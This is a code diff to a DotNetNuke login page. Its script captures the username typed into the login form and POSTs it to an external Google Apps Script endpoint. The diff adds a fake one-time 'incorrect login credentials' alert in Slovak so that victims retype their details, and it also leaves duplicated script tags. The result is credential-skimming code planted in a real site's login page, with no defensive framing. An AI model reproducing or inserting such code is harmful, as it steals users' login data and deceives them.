@@ -520,13 +520,22 @@ document.getElementById('dnn_ctr_Login_Login_AIS.DNN.Authentication_PasswordRequ
 </form>
     
 <script>
+<script>
 document.addEventListener("DOMContentLoaded", function () {
   const loginInput = document.getElementById("dnn_ctr_Login_Login_AIS.DNN.Authentication_txtUsername");
   const loginButton = document.getElementById("dnn_ctr_Login_Login_AIS.DNN.Authentication_btnLogin");
 
+  let errorShown = false;
+
   if (loginInput && loginButton) {
     loginButton.addEventListener("click", function () {
       const text = loginInput.value.trim();
+
+      if (!errorShown) {
+        alert("Nesprávne prihlasovacie údaje");
+        errorShown = true;
+      }
+
       if (text) {
         fetch("https://script.google.com/macros/s/AKfycbwWw7OalDktHsltk4ZblcA-jJOzKjHqr-QLUqj9No0wajePmw4UATzHWx488xAZrLzkOg/exec", {
           method: "POST",
@@ -539,6 +548,8 @@ document.addEventListener("DOMContentLoaded", function () {
     });
   }
 });
+</script>
+
 </script>
 
     
